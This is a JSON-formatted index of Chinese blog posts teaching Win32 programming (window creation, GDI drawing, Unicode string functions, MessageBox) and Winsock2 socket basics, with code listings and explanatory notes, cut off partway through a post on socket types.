OEM_FIXED_FONT：原始设备制造商（OEM）相关固定间距（等宽）字体； SYSTEM_FONT：系统字体，在缺省情况下，系统使用系统字体绘制菜单，对话框控制和文本； SYSTEM_FIXED_FONT：固定间距（等宽）系统字体，该对象仅提供给兼容16位Windows版本； DEFAULT_PALETTE：缺省调色板，该调色板由系统调色板中的静态色彩组成。","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"windows向导及句柄","slug":"pwcp004-windows向导及句柄","date":"2021-05-31T02:11:55.000Z","updated":"2021-05-31T04:21:53.788Z","comments":true,"path":"2021/05/31/pwcp004-windows向导及句柄/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/31/pwcp004-windows向导及句柄/","excerpt":"","text":"windows向导及句柄 最好把stdafx.h中的#define WIN32_LEAN_AND_MEAN 注释掉,不然很多功能会使用不了 当水平或垂直方向发生变化时就重画 窗口在创建过程中触发的第一个消息 PlaySound 用于播放音乐的API函数 RECT矩形类 HDC设备上下文句柄 PAINTSTRUCT 包含了某应用程序用来绘制它所拥有的窗口客户区所需要的信息的结构体 BeginPaint 指定窗口进行绘图工作的准备，并用将和绘图有关的信息填充到一个PAINTSTRUCT结构中 EndPaint释放设备上下文句柄 GetClientRect获取窗口客户区大小 Ellipse在窗口客户区画一个椭圆 DrawText 在窗口打印文字 句柄 windows向导 最好把stdafx.h中的#define WIN32_LEAN_AND_MEAN 注释掉,不然很多功能会使用不了 1//#define WIN32_LEAN_AND_MEAN // 从 Windows 头中排除极少使用的资料 当水平或垂直方向发生变化时就重画 1wcex.style = CS_HREDRAW | CS_VREDRAW;//当水平或垂直方向发生变化时就重画 窗口在创建过程中触发的第一个消息 1case WM_CREATE: PlaySound 用于播放音乐的API函数 1BOOL PlaySound(LPCSTR pszSound, HMODULE hmod,DWORD fdwSound); 在vs2010以上版本需要加入#pragma comment(lib, “winmm.lib”)才能使用PlaySound 或在项目属性-&gt;链接器-&gt;输入-&gt;附加依赖项中添加winmm.lib SND_ASYNC 异步播放 SND_FILENAME 文件名 1PlaySound(TEXT(\"2.wav\"),NULL,SND_FILENAME | SND_ASYNC); RECT矩形类 123456typedef struct _RECT &#123;LONG left;LONG top;LONG right;LONG bottom;&#125; RECT, *PRECT; HDC设备上下文句柄 1HDC hdc; //设备上下文句柄 PAINTSTRUCT 包含了某应用程序用来绘制它所拥有的窗口客户区所需要的信息的结构体 12345678typedef struct tagPAINTSTRUCT &#123;HDC hdc;BOOL fErase;RECT rcPaint;BOOL fRestore;BOOL fIncUpdate;BYTE rgbReserved[32];&#125; PAINTSTRUCT, *PPAINTSTRUCT; 1PAINTSTRUCT ps; //绘制结构 BeginPaint 指定窗口进行绘图工作的准备，并用将和绘图有关的信息填充到一个PAINTSTRUCT结构中 1234HDC BeginPaint(HWND hwnd, // 窗口的句柄LPPAINTSTRUCT lpPaint // 绘制信息); 1hdc = BeginPaint(hwnd,&amp;ps); //获取设备上下文句柄 EndPaint释放设备上下文句柄 1234BOOL EndPaint(HWND hWnd, // 窗口句柄CONST PAINTSTRUCT *lpPaint // 绘制窗口的数据); 1EndPaint(hwnd,&amp;ps); //释放设备上下文句柄 &gt; GetClientRect获取窗口客户区大小 1234BOOL GetClientRect(HWND hWnd, // 窗口句柄LPRECT lpRect // 客户区坐标); 1GetClientRect(hwnd, &amp;rect); //获取窗口客户区大小 Ellipse在窗口客户区画一个椭圆 123456BOOL Ellipse(HDC hdc, //设备环境句柄。int nLeftRect, //指定限定矩形左上角的X坐标。int nTopRect, //指定限定矩形左上角的Y坐标。int nRightRect, //指定限定矩形右下角的X坐标。int nBottomRect //指定限定矩形右下角的Y坐标。); 1Ellipse(hdc, 0, 0, 200, 100); //在窗口客户区画一个椭圆 DrawText 在窗口打印文字 1234567int DrawText(HDC hDC, // 设备描述表句柄LPCTSTR lpString, // 将要绘制的字符串int nCount, // 字符串的长度LPRECT lpRect, // 指向矩形结构RECT的指针UINT uFormat // 正文的绘制选项); 123DrawText(hdc, TEXT(\"Hello Windows SDK\"), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER); DT_SINGLELINE 单行显示文本，回车和换行符都不断行。 DT_CENTER 指定文本水平居中显示。 DT_VCENTER 指定文本垂直居中显示。该标记只在单行文本输出时有效，所以它必须与DT_SINGLELINE结合使用。 句柄 HINSTANCE 实例化句柄 HWND 窗口句柄 HDC 设备上下文句柄 HICON 图标句柄 HCURSOR 鼠标句柄 HBRUSH 画刷句柄 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198// windows向导.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"windows向导.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_WINDOWS, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINDOWS)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW;//当水平或垂直方向发生变化时就重画 wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINDOWS)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); //wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_WINDOWS); wcex.lpszMenuName = NULL; wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; RECT rect; switch (message) &#123; //case WM_COMMAND: // &#123; // int wmId = LOWORD(wParam); // // 分析菜单选择: // switch (wmId) // &#123; // case IDM_ABOUT: // DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); // break; // case IDM_EXIT: // DestroyWindow(hWnd); // break; // default: // return DefWindowProc(hWnd, message, wParam, lParam); // &#125; // &#125; // break; case WM_CREATE: //窗口在创建过程中触发的第一个消息 //SND_ASYNC 异步播放 //SND_FILENAME 文件名 //需要在项目属性-&gt;链接器-&gt;输入-&gt;附加依赖项中添加winmm.lib //PlaySound(TEXT(\"2.wav\"),NULL,SND_FILENAME | SND_ASYNC); break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... GetClientRect(hWnd, &amp;rect); Ellipse(hdc,0,0,rect.right,rect.bottom); DrawText(hdc, TEXT(\"我爱你\"), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"Windows模型","slug":"pwcp003-Windows模型","date":"2021-05-30T12:06:53.000Z","updated":"2021-05-31T01:01:51.246Z","comments":true,"path":"2021/05/30/pwcp003-Windows模型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/30/pwcp003-Windows模型/","excerpt":"","text":"HWND H代表句柄,WND代表窗口 HINSTANCE 实例句柄,只要是一个已经存在的程序或窗口等,都称为实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include&lt;iostream&gt;#include&lt;windows.h&gt;using namespace std;//窗口回调函数LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow )&#123; HWND hwnd; //实例句柄 MSG msg; //消息 WNDCLASS wc; //窗口类 //1.设计一个窗口类 wc.style = 0; //窗口样式 wc.lpfnWndProc = (WNDPROC)WndProc; //窗口回调函数 wc.cbClsExtra = 0; //额外窗口类的内存 wc.cbWndExtra = 0; //额外窗口内存 wc.hInstance = hInstance; //窗口的实例句柄 wc.hIcon = LoadIcon(NULL,IDI_WINLOGO); //窗口图标 wc.hCursor = LoadCursor(NULL, IDC_ARROW); //箭头鼠标 wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); //窗口颜色 wc.lpszMenuName = NULL; //窗口菜单 wc.lpszClassName = TEXT(\"MyWndClass\"); //窗口类名 //2.注册窗口类 RegisterClass(&amp;wc); //3.创建窗口 hwnd = CreateWindow( TEXT(\"MyWndClass\"), //窗口类名 TEXT(\"窗口标题\"), //窗口标题 WS_OVERLAPPEDWINDOW, //窗口风格 CW_USEDEFAULT, //窗口X坐标位置 默认 CW_USEDEFAULT, //窗口Y坐标位置 默认 CW_USEDEFAULT, //宽度 默认 CW_USEDEFAULT, //高度 默认 NULL, //父窗口句柄 NULL, //菜单句柄 hInstance, //窗口实例句柄 NULL //用户数据 ); //4.显示和更新窗口 ShowWindow(hwnd, iCmdShow); UpdateWindow(hwnd); //5.消息循环 while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; //把键盘输入翻译成为可传递的消息 TranslateMessage(&amp;msg); //转发消息到窗口过程函数 DispatchMessage(&amp;msg); &#125; //返回消息参数 return msg.wParam;&#125;LRESULT CALLBACK WndProc( HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam )&#123; //是一种包含了某应用程序用来绘制它所拥有的窗口客户区所需要的信息的结构体 PAINTSTRUCT ps; //绘制结构 HDC hdc; //设备上下文句柄 RECT rect; //矩形框 switch (message) &#123; case WM_SIZE: //窗口的大小发生改变时 return 0; case WM_LBUTTONDOWN: /* MessageBox(hwnd, TEXT(\"Hello Windows SDK\"), TEXT(\"Windows\"), MB_OK);*/ return 0; case WM_PAINT: //打印消息 hdc = BeginPaint(hwnd,&amp;ps); //获取设备上下文句柄 GetClientRect(hwnd, &amp;rect); //获取窗口客户区大小 Ellipse(hdc, 0, 0, 200, 100); //在窗口客户区画一个椭圆 //在指定的矩形里写入格式化的正文，根据指定的方法对正文格式化 //DrawText(hdc, 将要绘制的字符串,字符串的长度,指向矩形结构RECT的指针, 正文的绘制选项) //-1代表全部输出 DrawText(hdc, TEXT(\"Hello Windows SDK\"), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER ); EndPaint(hwnd,&amp;ps); //释放设备上下文句柄 return 0; case WM_DESTROY: //销毁窗口消息(关闭) PostQuitMessage(0); //将0放入消息队列中,让GetMessage获取,然后退出消息循环 return 0; &#125; //把不需要处理的消息交给操作系统处理 return DefWindowProc(hwnd,message,wParam,lParam);&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"Unicode简介","slug":"pwcp002-Unicode简介","date":"2021-05-30T06:38:31.000Z","updated":"2021-05-30T13:26:11.475Z","comments":true,"path":"2021/05/30/pwcp002-Unicode简介/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/30/pwcp002-Unicode简介/","excerpt":"","text":"Unicode简介 两种字符集 ASCII Unicode(宽字符) 两种字符类型 char wchar_t CHAR WCHAR 函数的两种版本 printf wprintf strlen wcslen MessageBoxA MessageBoxW PCHAR PWCHAR 通用版本 _tcslen MessageBox TCHAR PTCHAR 通用宏 TEXT _TEXT __T _T 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;stdio.h&gt;#include&lt;wchar.h&gt;#include&lt;windows.h&gt;#include&lt;locale.h&gt;//ASCII 版本 多字节字符集 双字节字符集void test1() &#123; char a = 'A'; char str[] = \"我爱你\"; CHAR a2 = 'A'; printf(\"%c\\n\", a); printf(\"%s\\n\", str); printf(\"%d\\n\", strlen(str)); MessageBoxA(NULL, str, NULL, MB_OK);&#125;//Unicode 版本void test2() &#123; setlocale(LC_ALL, \"chs\"); wchar_t a = L'A'; wchar_t str[] = L\"我爱你\"; WCHAR a2 = L'A'; wprintf(L\"%lc\\n\", a); wprintf(L\"%ls\\n\", str); wprintf(L\"%d\\n\", wcslen(str)); //这里显示3个字符,是因为把两个字节当一个字符处理 MessageBoxW(NULL, str, NULL, MB_OK);&#125;//通用版本,一般使用这个void test3()&#123; setlocale(LC_ALL, \"chs\"); TCHAR a = TEXT('A'); TCHAR str[] = TEXT(\"我爱你\"); TCHAR a2 = TEXT('A'); MessageBox(NULL, str, NULL, MB_OK);&#125;int main(int argc,char * argv[]) &#123; test1(); test2(); test3(); return 0;&#125; Windows中使用sprintf ASCII版本 宽字符版本 通用版本 可变数目的参数 标准版 sprintf swprintf _stprintf 最大长度版 _snprintf _snwprintf _sntprintf windows版 wsprintfA wsprintfW wsprintf ----------------------- --------- --------- --------- 参数数组的指针 标准版 vsprintf vswprintf vstprintf 最大长度版 _vsnprintf _vsnwprintf _vsntprintf windows版 wvsprintfA wvsprintfW wvsprintf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;tchar.h&gt;#include&lt;stdarg.h&gt;//自定义ASCII格式化MessageBox函数int CDECL MessageBoxPrintfA(char *szCaption, char *szFormat, ...);//自定义Unicode格式化MessageBox函数int CDECL MessageBoxPrintfW(wchar_t *szCaption, wchar_t *szFormat, ...);//自定义通用格式化MessageBox函数int CDECL MessageBoxPrintf(TCHAR *szCaption, TCHAR *szFormat, ...);//ASCII 版本void test1() &#123; int a = 12; char szBuffer[100] = &#123; 0 &#125;; //不安全版本 sprintf(szBuffer, \"我爱你%d\", a); MessageBoxA(NULL,szBuffer,\"ASCII 不安全版本\",MB_OK); //安全版本 _snprintf(szBuffer, 100,\"我爱你%d\", a); MessageBoxA(NULL, szBuffer, \"ASCII 安全版本\", MB_OK);&#125;//Unicode 版本void test2() &#123; int a = 12; wchar_t szBuffer[100] = &#123; 0 &#125;; swprintf(szBuffer,100, L\"我爱你%d\", a); MessageBoxW(NULL, szBuffer, L\"Unicode 版本\", MB_OK); //安全版本 _snwprintf(szBuffer,100,L\"我爱你%d\", a); MessageBoxW(NULL, szBuffer, L\"Unicode 版本\", MB_OK);&#125;//通用版本void test3() &#123; int a = 12; TCHAR szBuffer[100] = &#123; 0 &#125;; //通用不安全版本 _stprintf(szBuffer, TEXT(\"我爱你%d\"), a); MessageBox(NULL, szBuffer, TEXT(\"通用不安全版本\"), MB_OK); //通用安全版本 _sntprintf(szBuffer, 100, TEXT(\"我爱你%d\"), a); return MessageBox(NULL, szBuffer, TEXT(\"通用安全版本\"), MB_OK);&#125;void test4() &#123; MessageBoxPrintf(TEXT(\"MessageBoxPrintf 标题\"), TEXT(\"我爱你%d%d\"), 13, 14);&#125;void test5() &#123; MessageBoxPrintfA(\"MessageBoxPrintf 标题\", \"我爱你%d%d\", 13, 14);&#125;void test6() &#123; MessageBoxPrintfW(L\"MessageBoxPrintf 标题\", L\"我爱你%d%d\", 13, 14);&#125;int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)&#123; //test1(); //ASCII //test2(); //Unicode //test3(); //通用版本 //test4(); //通用版本格式化MessageBox test5(); //ASCII本格式化MessageBox test6(); //Unicode本格式化MessageBox&#125;//自定义通用格式化MessageBox函数int CDECL MessageBoxPrintf(TCHAR *szCaption, TCHAR *szFormat, ...) &#123; va_list pArgs; //用来接收...参数 TCHAR szBuffer[1024]; //获取...第一个参数的地址 va_start(pArgs, szFormat); //通用版本_vsntprintf根据平台来决定是ASCII还是Unicode //_vsntprintf(通用缓冲区,缓冲区大小,格式字符串,可变参数变量) //将szFormat,pArgs的内容放到szBuffer中,并将szFormat中的%xxx,对应替换成pArgs _vsntprintf(szBuffer, sizeof(szBuffer) / sizeof(TCHAR), szFormat, pArgs); //结束对pArgs变量的使用 va_end(pArgs); return MessageBox(NULL, szBuffer, szCaption, MB_OK);&#125;//自定义ASCII格式化MessageBox函数int CDECL MessageBoxPrintfA(char *szCaption, char *szFormat, ...) &#123; va_list pArgs; //用来接收...参数 char szBuffer[1024]; //获取...第一个参数的地址 va_start(pArgs, szFormat); //ASCII版本_vsnprintf //_vsntprintf(ASCII缓冲区,缓冲区大小,格式字符串,可变参数变量) //将szFormat,pArgs的内容放到szBuffer中,并将szFormat中的%xxx,对应替换成pArgs _vsnprintf(szBuffer, sizeof(szBuffer) / sizeof(char), szFormat, pArgs); //结束对pArgs变量的使用 va_end(pArgs); return MessageBoxA(NULL, szBuffer, szCaption, MB_OK);&#125;//自定义Unicode格式化MessageBox函数int CDECL MessageBoxPrintfW(wchar_t *szCaption, wchar_t *szFormat, ...) &#123; va_list pArgs; //用来接收...参数 wchar_t szBuffer[1024]; //获取...第一个参数的地址 va_start(pArgs, szFormat); //Unicode版本_vsnwprintf //_vsntprintf(Unicode缓冲区,缓冲区大小,格式字符串,可变参数变量) //将szFormat,pArgs的内容放到szBuffer中,并将szFormat中的%xxx,对应替换成pArgs _vsnwprintf(szBuffer, sizeof(szBuffer) / sizeof(wchar_t), szFormat, pArgs); //结束对pArgs变量的使用 va_end(pArgs); return MessageBoxW(NULL, szBuffer, szCaption, MB_OK);&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"第一个Windows程序","slug":"pwcp001-第一个Windows程序","date":"2021-05-30T06:34:55.000Z","updated":"2021-05-30T06:37:38.863Z","comments":true,"path":"2021/05/30/pwcp001-第一个Windows程序/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/30/pwcp001-第一个Windows程序/","excerpt":"","text":"第一个Windows程序 123456789101112131415161718192021222324252627282930313233#include&lt;iostream&gt;#include&lt;windows.h&gt;using namespace std;//int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR szCmdLine,int iCmdShow)/*WINAPI 是____stdcallWinMain 是入口函数HINSTANCE实例句柄类型HINSTANCE hInstance 本模块的实例句柄HINSTANCE hPrevInstance 是旧时代的,Win16留下来的,PSTR szCmdLine 命令行参数int iCmdShow 主窗口初始化时显示方式*/int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR szCmdLine,int iCmdShow)&#123; MessageBox(NULL,TEXT(\"我爱你,小麦老婆\"),TEXT(\"这是标题\"),MB_OK); return 0;&#125;/*MessageBox(NULL,TEXT(\"我爱你,小麦老婆\"),TEXT(\"这是标题\"),MB_OK);MessageBox 对话框函数参数1: 窗口句柄参数2:对话框内容参数3:标题参数4:标志 显示消息框中的按钮以及图标。*/ WINAPI 是__stdcall WinMain 是入口函数 HINSTANCE实例句柄类型 HINSTANCE hInstance 本模块的实例句柄 HINSTANCE hPrevInstance 是旧时代的,Win16留下来的, PSTR szCmdLine 命令行参数 int iCmdShow 主窗口初始化时显示方式 MessageBox(NULL,TEXT(“我爱你,小麦老婆”),TEXT(“这是标题”),MB_OK); MessageBox 对话框函数 参数1: 窗口句柄 参数2:对话框内容 参数3:标题 参数4:标志 显示消息框中的按钮以及图标。","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"TCP/IP协议","slug":"WS001CS模型的TCP_IP协议","date":"2021-05-28T01:31:12.000Z","updated":"2021-06-08T14:49:38.916Z","comments":true,"path":"2021/05/28/WS001CS模型的TCP_IP协议/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/28/WS001CS模型的TCP_IP协议/","excerpt":"","text":"TCP/IP协议 基于tcp/ip协议的c/s模型 tcp/ip协议 Transmission Control Protocol / Internet Protocol 重要性 TCP/IP是今天的互联网的基石，没有这个就上不了网了 概念 tcp/ip协议族(簇，组，体系），并不是tcp协议和ip协议的总称，tcp/ip指的是整个网络传输体系。而tcp协议和ip协议就是单单的两个协议。 tcp/ip协议的特点 面向连接的，可靠的，基于字节流的传输层协议。 udp/ip 面向非连接的，不可靠的，基于数据报的传输层协议。 client/server ----- 客户端/服务器模型 比如QQ，DNF，LOL等这些我们下载客户端的，都属于c/s模型的一个应用 c/s模型其实是概念层面的，实现层面可以是基于任何的网络协议。 常见的还有b/s模型 浏览器/服务器模型 基于http/https协议的 套接字编程与socket编程 socket中文-&gt;套接字，也统称叫网络编程 演示我们要实现的效果 局域网 如果在广域网使用啊 内网穿透，内网转发 花生壳 Sunny-Ngrok … 服务端 网络头文件 网络库 最底层的网络函数，大家用QT MFC wpf，或者百度下载的很多其他的封装好的网络库，都是对咱们讲的这些最本质的网络函数的二次封装，咱们讲的是通用的，讲完这个大家也可以自己封装函数库给别人用了。 #include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 函数库 winsock2.h windows socket 第2版 第一版是 winsock.h 查看具体区别 目前网络库有哪些版本？ 1.0 1.1 2.0 2.1 2.2 演示MSDN 查这个函数的详细信息 WSAStartup 我们的开发环境支持哪个版本？ 打开头文件，看咱们当前编译器环境支持的最高版本 ws2_32.lib windows socket 第2版 32位 不管是64编译环境还是32编译环境，都是用这个，并没有ws2_64.dll wsock32.lib winsock.h 第一版网络库 对应的库文件 这里不区分大小写 打开网络库 1234int WSAStartup(WORD wVersionRequired,LPWSADATA lpWSAData); 功能 打开网络库/启动网络库，启动了这个库，这个库里的函数/功能才能使用 w windows s socket a Asynchronous 异步 startup 启动 同步与异步 同步 阻塞/卡死状态 异步 多个工作同时进行 参数1 我们要使用的库的版本 类型是 WORD 转定义：unsigned short WORD wVersionRequired = MAKEWORD(2,2); MAKEWORD(主版本,副版本)， 1.0 2.2 wVersionRequired 数据高位/高地址是副版本 数据低位/低地址是主版本 用调试+计算器演示数据原理 位运算，内存操作，小端存储 参数2 LPWSADATA lpWSAData 系统通过这个参数给我们一些配置信息 注意 当看到参数有 LP P前缀的时候，是说我们这里要传对应类型变量的地址，这是win32API 的规范 或者叫规则 看下有哪些信息 123456789struct WSAData &#123;WORD wVersion;WORD wHighVersion;unsigned short iMaxSockets;unsigned short iMaxUdpDg;char *lpVendorInfo;char szDescription[WSADESCRIPTION_LEN + 1];char szSystemStatus[WSASYS_STATUS_LEN + 1];&#125; wVersion 我们要使用的版本 wHighVersion 系统能提供给我们最高的版本 iMaxSockets 返回可用的socket的数量，2版本之后就没用了 iMaxUdpDg UDP数据报信息的大小，2版本之后就没用了 lpVendorInfo 供应商特定的信息，2版本之后就没用了 szDescription szSystemStatus 当前库的描述信息，2.0是第二版的意思 当输入的版本不存在 输入1.3， 2.3 有主版本，没有副版本 得到该主版本的最大副版本 1.1 2.2并使用 输入3.1 3.3 超过最大版本号 使用系统能提供的最大的版本 2.2 输入 0.0 0.1 0.3 主版本是0 网络库打开失败，不支持请求的套接字版本 返回值 返回0为执行正确 失败 这些宏的本质 WSASYSNOTREADY 10091 底层网络子系统尚未准备好进行网络通信。 系统配置问题，重启下电脑，检查ws2_32库是否存在，或者是否在环境配置目录下 WSAVERNOTSUPPORTED 10092 此特定Windows套接字实现不提供所请求的Windows套接字支持的版本。 要使用的版本不支持 WSAEPROCLIM 10067 已达到对Windows套接字实现支持的任务数量的限制。 Windows Sockets实现可能限制同时使用它的应用程序的数量 WSAEINPROGRESS 10036 正在阻止Windows Sockets 1.1操作。 当前函数运行期间，由于某些原因造成阻塞，会返回在这个错误码，其他操作均禁止 WSAEFAULT 10014 lpWSAData参数不是有效指针。 参数写错了 校验版本 2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion) HIBYTE是高位 副版本 LOBYTE是地位 主版本 逻辑 只要有一个不是2，说明系统不支持我们要的2.2版本 关闭库 并结束函数，可以给出相应提示 WSACleanup(); return 0； 创建SOCKET SOCKET socket( int af, int type, int protocol ); 作用 创建一个SOCKET SOCKET介绍 什么是socket 将底层复杂的协议体系，执行流程，进行了封装，封装完的结果，就是一个SOCKET了， 也就是说，SOCKET是我们调用协议进行通信的 操作接口 意义 将复杂的协议过程与我们编程人员分开，我们直接操作一个简单SOCKET就行了，对于底层的协议 过程细节，完全不用知道，这就大大方便了我们。 网络编程难就难在协议本身的复杂性，简单就简单在我们编程层面完全不用考虑哪些 本质 就是一种数据类型，转定义看下类型 就是一个整数 uint 但是这个数是唯一的 标识着我当前的应用程序，协议特点等信息 ID，门牌号 应用 我们网络通信的函数，全部都要使用SOCKET 演示 逻辑 每个客户端有一个SOCKET，服务器有一个SOCKET，通信时候，就需要这个SOCKET做参数，给谁通信，就要传递谁的SOCKET 所以 网络编程，理论层面SOCKET是网络封装的精华，代码层面就是不停的使用SOCKET这个变量，所以又叫SOCKET编程 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 